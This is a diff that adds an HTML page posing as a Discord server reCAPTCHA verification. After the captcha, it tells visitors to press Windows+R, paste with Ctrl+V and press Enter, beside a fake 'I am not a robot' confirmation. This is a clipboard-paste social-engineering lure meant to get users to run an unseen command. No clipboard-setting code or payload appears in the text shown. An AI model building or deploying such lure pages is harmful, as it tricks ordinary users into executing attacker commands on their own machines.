@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Discord Server Verification</title>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .box {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .title-label {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .verification-steps {
+      display: none;
+      margin-top: 30px;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      border: 1px solid #ddd;
+      max-width: 400px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+    }
+
+    .verification-steps h3 {
+      color: #007bff;
+      margin-bottom: 10px;
+    }
+
+    .verification-steps ol {
+      text-align: left;
+      margin-top: 10px;
+    }
+
+    .verify-button {
+      margin-top: 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    .green-check {
+      margin-top: 15px;
+      color: green;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="title-label">Verify to access my Discord server</div>
+    <form id="captcha-form">
+      <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY_HERE" data-callback="captchaSuccess"></div>
+    </form>
+  </div>
+
+  <div class="verification-steps" id="stepsBox">
+    <h3>Complete these <strong>Verification Steps</strong></h3>
+    <p>To better prove you are not a robot, please:</p>
+    <ol>
+      <li>Press & hold the <strong>Windows Key</strong> + <strong>R</strong>.</li>
+      <li>In the verification window, press <strong>Ctrl + V</strong>.</li>
+      <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
+    </ol>
+    <div class="green-check">✅ "I am not a robot - reCAPTCHA Verification ID: 8883"</div>
+    <button class="verify-button">VERIFY</button>
+  </div>
+
+  <script>
+    function captchaSuccess() {
+      document.getElementById("stepsBox").style.display = "block";
+    }
+  </script>
+</body>
+</html>
